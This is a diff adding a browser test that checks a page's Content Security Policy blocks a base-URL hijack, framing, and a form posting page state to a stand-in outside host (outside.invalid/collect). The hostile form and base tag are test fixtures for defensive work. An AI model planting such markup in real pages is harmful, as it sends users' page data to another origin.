@@ -73,6 +73,82 @@ from render_support import (
 pytestmark = pytest.mark.nightly
 
 
+def test_the_page_policy_blocks_non_fetch_escape_routes(browser, serve):
+    """The source can carry ordinary HTML and a package module runs as same-origin
+    script. Neither may replace the document base, submit page state to another origin,
+    or put a live Leaf under somebody else's controls."""
+    source = leaf_page(
+        "CSP boundaries",
+        """
+<h1 id="h">CSP boundaries</h1>
+<a id="relative" href="relative-target">Relative target</a>
+<form id="escape" action="https://outside.invalid/collect" method="post">
+  <input name="page-state" value="reader decision">
+  <button type="submit">Send page state</button>
+</form>
+""",
+        head='<base href="https://outside.invalid/rebased/">',
+    )
+    url = live_url(serve(source))
+    page, errors = open_page(
+        browser,
+        url,
+        init_script="""
+          window.__cspViolations = [];
+          document.addEventListener('securitypolicyviolation', event => {
+            window.__cspViolations.push(event.effectiveDirective);
+          });
+        """,
+    )
+    escaped = []
+    page.route(
+        "https://outside.invalid/**",
+        lambda route: (
+            escaped.append(route.request.url),
+            route.fulfill(status=204, body=""),
+        ),
+    )
+    try:
+        page.wait_for_function("() => window.__cspViolations.includes('base-uri')")
+        served = urlparse(page.url)
+        assert (
+            page.locator("#relative").evaluate("link => link.origin")
+            == f"{served.scheme}://{served.netloc}"
+        )
+
+        framed = page.locator("body").evaluate(
+            """async (body, url) => {
+              const frame = document.createElement('iframe');
+              frame.id = 'framed-leaf';
+              frame.src = url;
+              const loaded = new Promise((resolve, reject) => {
+                frame.addEventListener('load', resolve, {once: true});
+                setTimeout(() => reject(new Error('framed Leaf did not settle')), 5000);
+              });
+              body.append(frame);
+              await loaded;
+              return frame.contentDocument?.querySelector('#h')?.textContent ?? null;
+            }""",
+            page.url,
+        )
+        assert framed is None
+
+        page.locator("#escape").evaluate("form => form.requestSubmit()")
+        page.wait_for_function("() => window.__cspViolations.includes('form-action')")
+        assert escaped == []
+        assert any("frame-ancestors 'none'" in error for error in errors), errors
+        unexpected = [
+            error
+            for error in errors
+            if not (
+                "Content Security Policy" in error or "Content-Security-Policy" in error
+            )
+        ]
+        assert unexpected == []
+    finally:
+        page.close()
+
+
 def test_a_website_example_says_no_agent_will_respond(browser, serve):
     page, errors = open_page(
         browser,
